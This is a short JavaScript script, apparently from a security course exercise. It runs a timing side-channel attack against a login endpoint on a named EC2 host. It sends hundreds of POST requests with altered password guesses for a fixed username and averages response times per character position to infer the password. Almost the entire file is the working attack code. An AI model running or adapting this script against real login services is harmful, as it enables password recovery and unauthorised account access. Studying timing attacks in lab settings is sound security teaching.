var url = 'https://ec2-54-188-28-123.us-west-2.compute.amazonaws.com:8080/';
var uname = "au597939";

// var pass = "Password";
// var uname = "au597939";

// var formData = new FormData();
// formData.append('username', uname);
// formData.append('password', pass);

// fetch(url, {
//     method: 'POST',
//     body: formData
// }).then(res => {
//     var ok = res.ok;
//     if (ok) {
//         console.log("Authenticated correctly");
//     } else {
//         console.log("Not authenticated!");
//     }
// });

var log = [];
let pass = "Password";
let wrongChar = "i";
let repl = 100;
var wrongPromises = [];
var wrongTiming = [];
for (let i = 0; i < 8; i++) {
    wrongTiming.push([]);
    for (let j = 0; j < repl; j++) {
        let tamperedPass = pass.slice(0,i) + wrongChar + pass.slice(i);
        let formData = new FormData();
        formData.append('username', uname);
        formData.append('password', tamperedPass);
        let startTime = new Date().getTime();
        wrongPromises.push(fetch(url, {
          method: 'POST',
          body: formData
        }).then(res => {
          wrongTiming[i].push(new Date().getTime() - startTime);
        }));
    }
}

Promise.all(wrongPromises).then(() => {
  console.log(wrongTiming.map(arr => arr.reduce((prev, curr) => prev + curr) / arr.length));
});